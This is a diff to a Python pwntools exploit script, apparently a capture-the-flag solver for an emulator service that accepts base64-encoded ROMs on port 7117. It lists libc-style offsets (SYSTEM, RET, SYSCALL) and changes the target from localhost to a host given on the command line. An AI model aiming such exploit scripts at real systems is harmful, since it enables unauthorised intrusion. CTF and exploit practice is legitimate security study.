@@ -1,5 +1,6 @@
 from pwn import *
 import aquarius_assembler as asm
+import sys
 import base64
 
 CODE_SIZE = 1024
@@ -15,6 +16,9 @@ SYSTEM = 0x58740
 RET = 0x000000000009819C + 3
 RET_ADDRESS_OFFSET = -0xAC0
 SYSCALL = 0x98FA6
+
+HOST = sys.argv[1]
+PORT = 7117
 
 
 def main():
@@ -64,7 +68,7 @@ def main():
 
     code = code.ljust(CODE_SIZE, asm.hlt())
 
-    io = remote("localhost", 7117)
+    io = remote(HOST, PORT)
     io.sendlineafter(b"> ", b"1")
     io.sendlineafter(b"base64 encoded rom> ", base64.b64encode(code))
     io.recvuntil(b"id: ")
